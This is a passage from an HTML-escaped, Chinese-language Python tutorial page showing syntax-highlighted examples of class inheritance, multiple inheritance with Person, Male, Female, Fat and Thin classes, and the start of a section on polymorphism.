&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;She is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Male&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#实例化的时候，就不需要再次传入性别参数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaohong=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Female&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaohong&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaohong.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;多重继承：&lt;&#x2F;p&gt;
&lt;p&gt;多重继承用于实现子类对多个父类的继承&lt;&#x2F;p&gt;
&lt;p&gt;通过多重继承，可以混合不同类的功能，实现更加复杂的要求&lt;&#x2F;p&gt;
&lt;p&gt;人(超类)&lt;&#x2F;p&gt;
&lt;p&gt;男（子类）女（子类）胖（子类）瘦（子类）&lt;&#x2F;p&gt;
&lt;p&gt;男胖 男瘦 女胖 女瘦&lt;&#x2F;p&gt;
&lt;p&gt;男胖小明（实例） 女瘦小红（实例）&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Male&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建子类&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the Male class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#给子类设置构造函数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Person.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,name,age,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#子类调用父类的构造函数，并进行修改。在这里直接将父类的gender设置为‘male’&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;He is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Female&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the Female class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Person.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,name,age,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;female&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;She is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Fat&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the fat class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printweight&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;fat&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Thin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the thin class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printweight&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;thin&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;MaleFat&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Male&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Fat&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#多重继承&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;pass&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;FemaleThin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Female&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Thin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#多重继承&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;pass&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MaleFat&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#实例化的时候，就不需要再次传入性别参数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaohong=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FemaleThin&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaohong&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printweight&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaohong.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaohong.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printweight&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;类的多态：&lt;&#x2F;p&gt;
&lt;p&gt;多态是面向对象语言的基本特征，多态意味着变量并不知道引用的对象是什么，根据引用对象的不同表现不同的行为方式&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;random &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;choice&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
